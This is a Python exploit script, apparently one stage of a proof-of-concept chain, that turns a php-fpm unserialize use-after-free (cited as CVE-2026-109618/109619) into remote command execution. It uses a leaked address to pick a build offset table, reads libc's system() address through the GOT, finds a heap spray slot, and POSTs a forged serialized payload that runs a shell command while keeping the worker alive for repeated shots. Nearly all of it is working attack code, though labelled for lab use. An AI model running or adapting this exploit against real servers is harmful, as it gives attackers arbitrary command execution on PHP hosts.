#!/usr/bin/env python3
# INDEX: rce fire for no-echo comparison sink | fpm | pure | other(comparison sink) | build | consumes stage-1 leak
"""Offset-table fire for the php-fpm unserialize var_hash UAF over a no-echo sink.
CVE-2026-109618 / CVE-2026-109619.

Bug credit: iQingshan var_hash unserialize UAF (CVE-2026-109618/109619).

A comparison sink (usort / ORDER BY render, an ordered access gate) carries the
leak (chunk + binbase, byte-exact) but cannot carry a pointer-chase + strcmp, so
by-name resolution is unreachable over it. This module replaces by-name
resolution with a per-build offset table so every target becomes an anchored
binbase+CONST / chunk+CONST read -- the one primitive the sink already speaks:
executor_globals (0 reads), system() (one GOT read), stdClass ce (one read),
spray slot (a bounded length-probe), and the fire POSTed through the app's own
unserialize(). The leaked &zval_ptr_dtor page offset fingerprints the build and
selects the table. Table derived statically with readelf (offline, not in the
live path). Imports the project modules read-only. Pure stdlib, safe under
python3 -I. Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
import time
from urllib.parse import quote_from_bytes, urlsplit

_POC = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_POC)  # poc/


def _load(fname):
    path = os.path.join(_POC, fname)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, fname)
    spec = importlib.util.spec_from_file_location(fname[:-3], path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_POC, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


_dispatch_fire = _load("primitives/dispatch/fire.py")
_dispatch_spray = _load("primitives/dispatch/spray_slot.py")


# Per-build offset tables.
# Fingerprint key: &zval_ptr_dtor mod 2 MiB (low 21 bits of the Stage-1-leaked
# image pointer). The Stage-1 leak yields it for free; it selects the table.
TABLE_8426 = {
    "name": "php:8.4.26-fpm (BuildID a8f0ad79)",
    "fp_zval_ptr_dtor_mod": 0x7038e0 & 0x1FFFFF,   # = 0x1038e0
    # --- php-fpm PIE image offsets (readelf -sW /usr/local/sbin/php-fpm) ---
    "ZVAL_PTR_DTOR_OFF": 0x7038e0,     # the Stage-1 image-pointer anchor
    "EG_OFF":            0x16e22c0,    # executor_globals
    "CSD_BSS_OFF":       0x16e8368,    # &zend_standard_class_def
    "GOT_FREE_SLOT":     0x1600458,    # .got.plt JUMP_SLOT free@GLIBC
    # --- libc.so.6 symbol offsets (readelf -sW libc.so.6) ---
    "LIBC_FREE_OFF":     0xa2fc0,      # free   (the GOT slot we read)
    "LIBC_SYSTEM_OFF":   0x53090,      # system
    # --- fire geometry (8.4.26) ---
    "GPF_HANDLER_OFF":   192,          # get_properties_for @ handler+0xC0
    # --- spray slot: chunk + this; discovered/confirmed by a bounded
    #     length-probe over the sink when None (shape-dependent constant).
    #     0x75500 = page 117 slot 4 (data at +0x18 -> 0x75518), the proven
    #     cook=-shape spray home on this build. The order.php rows= shape may home elsewhere
    #     -> the probe recalibrates.
    "SPRAY_FIRE_OFF":    0x75500,
}

TABLES = [TABLE_8426]

# drift guard: TABLE_8426's shared anchors must match the canonical fpm offsets
# in common/offsets (BUILTIN_OFFSETS["8.4.26-fpm"]); a mismatch means drift.
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.offsets import load_offsets as _load_offsets  # noqa: E402
_canon = _load_offsets("8.4.26", "fpm-fcgi")
assert TABLE_8426["ZVAL_PTR_DTOR_OFF"] == _canon["zval_ptr_dtor"], \
    f"TABLE_8426 ZVAL_PTR_DTOR_OFF {TABLE_8426['ZVAL_PTR_DTOR_OFF']:#x} != canonical {_canon['zval_ptr_dtor']:#x}"
assert TABLE_8426["EG_OFF"] == _canon["bss_anchors"]["executor_globals"], \
    f"TABLE_8426 EG_OFF {TABLE_8426['EG_OFF']:#x} != canonical {_canon['bss_anchors']['executor_globals']:#x}"


def select_table(dtor):
    """Fingerprint the build from the Stage-1-leaked &zval_ptr_dtor."""
    key = dtor & 0x1FFFFF
    for t in TABLES:
        if t["fp_zval_ptr_dtor_mod"] == key:
            return t
    return None


# The sort-sink anchored read (the sink's native language)
class SortReader:
    """Wrap sideeffect_exfil_apps's SORT recovery as a general anchored
    read: read_qword(addr) -> low 48 bits of *(addr), via the usort rank
    (1 byte/request). The fire uses only this read primitive; the reflective
    (echo) reads are never called."""

    def __init__(self, X, adapter):
        self.X = X
        self.ad = adapter

    def read_qword(self, addr):
        # forge an IS_STRING whose data region is AT addr: data@fake+0x18=addr.
        fake = addr - 0x18
        self.ad.set_payload(self.X.build_isstring_payload(fake))
        rec = self.X.recover_field(self.ad, b"", 0, self.X.PTR_BYTES)
        return int.from_bytes(rec + b"\x00" * (8 - len(rec)), "little")

    def read_len(self, addr):
        """Low 16 bits of the zend_string length at `addr` (addr+0x10), used by
        the spray-slot probe. The slot's data pointer is addr+0x18; its length
        field is addr+0x10, so we read 2 bytes there."""
        fake = (addr + 0x10) - 0x18  # data@fake+0x18 = addr+0x10 (the len field)
        self.ad.set_payload(self.X.build_isstring_payload(fake))
        rec = self.X.recover_field(self.ad, b"", 0, 2)
        return int.from_bytes(rec, "little")


# Fire delivery through the app's own unserialize() (order.php `rows`)
def _post_rows(http, path, payload):
    """POST payload under the sort app's own field name; the UAF triggers inside
    the app's unserialize($_POST['rows']). No echo is read."""
    body = b"rows=" + quote_from_bytes(payload).encode()
    import socket
    s = socket.socket()
    s.settimeout(5)
    req = (f"POST {path} HTTP/1.1\r\nHost: {http.host}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
           ).encode() + body
    try:
        s.connect((http.host, http.port))
        s.sendall(req)
        r = b""
        while True:
            c = s.recv(65536)
            if not c:
                break
            r += c
    except OSError:
        r = b""
    finally:
        s.close()
    http.reqs += 1
    return r


def exit0(cmd14):
    """Force the fired command to exit 0 so system()'s return value -> prop_ht is
    NULL and the worker SURVIVES (see build_fire_payload's worker-survival note). Appends
    ';true' when it fits the 14-byte budget; otherwise returns the command
    unchanged (the caller must then ensure a zero exit itself, e.g. a `cmd>file`
    redirect, which already exits 0)."""
    if isinstance(cmd14, str):
        cmd14 = cmd14.encode("latin-1")
    if not cmd14.endswith(b";true") and len(cmd14) + 5 <= 14:
        cmd14 = cmd14 + b";true"
    return cmd14


def build_fire_payload(seo, ce, system, spray_addr, cmd14, gpf_off):
    """Fire spray, built here so it rides the sort app's `rows` field
    (gpf @ handler+gpf_off)."""
    # WORKER SURVIVAL (lab-verified on 8.4.26-fpm): the forged
    # get_properties_for handler is libc system(); its RETURN VALUE (the shell
    # wait-status) is taken by the engine as prop_ht. A command that exits 0 ->
    # status 0 -> prop_ht=NULL -> the engine emits {} -> HTTP 200 and the worker
    # SURVIVES (multi-shot on one worker). ANY nonzero shell exit -> a small-int
    # prop_ht -> GC_IS_RECURSIVE deref -> SEGV -> 502 -> a fresh worker
    # (single-shot). So force a zero exit; the marker still lands either way.
    return _dispatch_fire.build_fire_payload(
        ce, system, spray_addr, cmd14, gpf_off,
        spray_len=seo.SPRAY_LEN, spray_count=seo.SPRAY_COUNT,
        c_part=seo._C_PART, ref_base=seo.REF_BASE, exit0_wrap=True)


# spray-slot discovery over the SORT sink (bounded length-probe)
def find_spray_slot_over_sort(reader, chunk, table, log=print):
    """Return (spray_addr, off) by probing the 320-byte-stride slots in the
    stable spray band for a 280-length (SPRAY_LEN) live slot, reading each
    slot's length over the sort sink. On 8.4.26 the freed-arData spray run is
    deterministic (page ~117); probe that band first. If the table already
    carries SPRAY_FIRE_OFF, confirm it in one probe."""
    SPRAY_LEN = reader.X.SPRAY_LEN
    if table.get("SPRAY_FIRE_OFF") is not None:
        addr = chunk + table["SPRAY_FIRE_OFF"]
        if (reader.read_len(addr) & 0xFFFF) == (SPRAY_LEN & 0xFFFF):
            log(f"  [R-6] spray slot (table const) @ 0x{addr:x} confirmed")
            return addr + 0x18, table["SPRAY_FIRE_OFF"]
        log("  [R-6] table SPRAY_FIRE_OFF did not confirm; falling back to probe")
    band = list(range(112, 124)) + [p for p in range(100, 136) if p < 112 or p >= 124]
    S, off = _dispatch_spray.find_spray_slot_scan(
        reader.read_len, chunk,
        match=lambda v: (v & 0xFFFF) == (SPRAY_LEN & 0xFFFF),
        band=band, with_offset=True, use_map=None, probe_budget=None)
    if S is not None:
        pn, slot = off // 0x1000, (off % 0x1000) // 320
        log(f"  [R-6] spray slot @ page {pn} slot {slot} 0x{chunk + off:x} "
            f"(off=0x{off:x})")
    return S, off


# End-to-end: leak (Stage 1) -> table resolve -> fire, all over the sort sink, no echo
def run(url, cmd=b"id>/tmp/o", attempts=3, probe_spray=True,
        fire_url=None, log=print):
    X = _load("primitives/oracles/sideeffect_exfil_apps.py")
    S1 = _load("sinkexfil_stage1.py")
    u = urlsplit(url if "://" in url else "http://" + url)
    http = X.Http(u.hostname, u.port or 80)
    path = u.path if u.path and u.path.endswith(".php") else "/order.php"
    sort = X.OrderAdapter(http, path)
    if not sort.detect():
        log(f"[fatal] {path} is not a sort sink")
        return 2
    log(f"[*] target {http.host}:{http.port}{path}  (SORT sink; NO echo)")

    # ---- Stage 1: remote leak (chunk + binbase + dtor), no echo ----
    # The shared no-echo Stage-1 exfil (here with no ordered gate and the
    # byte-by-byte recovery silenced).
    log("[stage1] a7 leak over the sort sink ...")
    chunk, binbase, dtor, _ = S1.sinkexfil_stage1(
        sort, gate=None, log=lambda *a, **k: None)
    if binbase is None:
        log("[stage1] FAIL: binbase not 2MB-aligned")
        return 1
    log(f"[stage1] chunk=0x{chunk:x} binbase=0x{binbase:x} "
        f"&zval_ptr_dtor=0x{dtor:x}  ({http.reqs} reqs)")

    # ---- fingerprint -> table ----
    table = select_table(dtor)
    if table is None:
        log(f"[fatal] no offset table for dtor fp 0x{dtor & 0x1FFFFF:x}")
        return 1
    log(f"[table] {table['name']}  (fp &zval_ptr_dtor mod 2MiB = "
        f"0x{dtor & 0x1FFFFF:x})")

    reader = SortReader(X, sort)

    # ---- executor_globals (pure arithmetic, 0 reads) ----
    eg = binbase + table["EG_OFF"]
    log(f"[R-3] executor_globals = 0x{eg:x}  (0 reads)")

    # ---- libc/system via ONE anchored GOT read ----
    r0 = http.reqs
    free_rt = reader.read_qword(binbase + table["GOT_FREE_SLOT"])
    libc = free_rt - table["LIBC_FREE_OFF"]
    system = libc + table["LIBC_SYSTEM_OFF"]
    if (libc & 0xFFF) != 0 or not (0x400000000000 <= libc < 0x800000000000):
        log(f"[R-4] FAIL: libc base 0x{libc:x} not sane (free@GOT=0x{free_rt:x}; "
            f"slot may be lazily unresolved -- warm the worker)")
        return 1
    log(f"[R-4] free@GOT=0x{free_rt:x} libc=0x{libc:x} system=0x{system:x}  "
        f"({http.reqs - r0} reqs)")

    # ---- stdClass ce via the zend_standard_class_def .bss slot ----
    r0 = http.reqs
    ce = reader.read_qword(binbase + table["CSD_BSS_OFF"])
    if not (0x10000 < ce < X.OBJ_OFF_SORT + (1 << 47)):
        log(f"[R-5] FAIL: ce 0x{ce:x} implausible")
        return 1
    log(f"[R-5] stdClass ce = 0x{ce:x}  ({http.reqs - r0} reqs)")

    # ---- spray slot ----
    r0 = http.reqs
    if probe_spray:
        spray_addr, off = find_spray_slot_over_sort(reader, chunk, table, log=log)
        if spray_addr is None:
            log("[R-6] FAIL: no live spray slot found in the band")
            return 1
        log(f"[R-6] spray_addr = 0x{spray_addr:x}  ({http.reqs - r0} reqs)")
    else:
        if table.get("SPRAY_FIRE_OFF") is None:
            log("[R-6] FAIL: no SPRAY_FIRE_OFF in table and --no-probe set")
            return 1
        spray_addr = chunk + table["SPRAY_FIRE_OFF"] + 0x18
        log(f"[R-6] spray_addr = 0x{spray_addr:x} (table const, 0 reqs)")

    # ---- fire via a get_properties_for DISPATCH path ----
    # DISPATCH REQUIREMENT (empirical, this build): the type-confusion fires
    # when the app invokes the confused object's get_properties_for handler --
    # serialize() / json_encode() / (array) cast / get_object_vars() / foreach /
    # var_dump(). The LEAK + RESOLUTION above need only a field READ (erd_field)
    # and so run fully over the no-dispatch sort sink; the FIRE additionally
    # needs the sink's app path to enumerate the decoded object. order.php's
    # usort compares pre-extracted SCALARS and never touches the object, so it is
    # leak+resolve-only for the fire. Point --fire-url at the app op that
    # materialises the object (here the lab's serialize endpoint stands in).
    seo = X._seo
    fpath = path
    fhttp = http
    if fire_url:
        fu = urlsplit(fire_url if "://" in fire_url else "http://" + fire_url)
        fhttp = X.Http(fu.hostname, fu.port or 80)
        fpath = fu.path if fu.path and fu.path.endswith(".php") else path
    log(f"[R-7] fire (gpf @ handler+0x{table['GPF_HANDLER_OFF']:x}) via "
        f"{fhttp.host}:{fhttp.port}{fpath} `rows`; {attempts} attempt(s)")
    if not fire_url:
        log("[R-7] NOTE: no --fire-url; firing against the sort sink. If that "
            "path does not enumerate the decoded object (get_properties_for), "
            "the fire will not land -- it is a DISPATCH gate, not a bandwidth "
            "one. See the module docstring.")
    fired = False
    for i in range(attempts):
        payload = build_fire_payload(seo, ce, system, spray_addr, cmd,
                                     table["GPF_HANDLER_OFF"])
        _post_rows(fhttp, fpath, payload)
        time.sleep(0.3)
        fired = True
        log(f"  attempt {i+1} delivered")
    http.reqs += fhttp.reqs
    log("=" * 64)
    log(f"[done] offset-table: leak+R-3..R-6 over the SORT sink (NO echo), fire "
        f"via a get_properties_for path. {http.reqs} requests. "
        f"binbase=0x{binbase:x} system=0x{system:x} ce=0x{ce:x} "
        f"spray=0x{spray_addr:x}")
    log(f"[done] verify: the --cmd marker lands AND -- for an exit-0 command --"
        f" the fire returns HTTP 200 with the worker ALIVE (multi-shot). system()"
        f"'s shell status becomes prop_ht, so a NONZERO-exit command still runs"
        f" (marker lands) but 502s and respawns the worker. exit0() auto-appends"
        f" ';true' when it fits the 14B budget.")
    return 0 if fired else 1


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default="http://127.0.0.1:8170/order.php",
                    help="SORT comparison sink URL (usort/ORDER BY over decoded "
                         "rows). NO echo endpoint is used.")
    ap.add_argument("--cmd", default="id>/tmp/o",
                    help="command to run (<=14 bytes after the GC byte; MUST exit "
                         "0 or the worker SEGVs -- exit0() appends ';true' when it "
                         "fits, and `cmd>file` already exits 0)")
    ap.add_argument("--attempts", type=int, default=3)
    ap.add_argument("--no-probe", action="store_true",
                    help="use the table's SPRAY_FIRE_OFF constant (0 reqs) "
                         "instead of the bounded length-probe for R-6")
    ap.add_argument("--fire-url", default=None,
                    help="app path whose code enumerates the decoded object "
                         "(get_properties_for: serialize/json_encode/(array)/"
                         "get_object_vars/foreach). The FIRE goes here; the "
                         "leak+resolution stay on --url (the sort sink).")
    a = ap.parse_args(argv)
    return run(a.url, cmd=a.cmd.encode("latin-1"), attempts=a.attempts,
               probe_spray=not a.no_probe, fire_url=a.fire_url)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
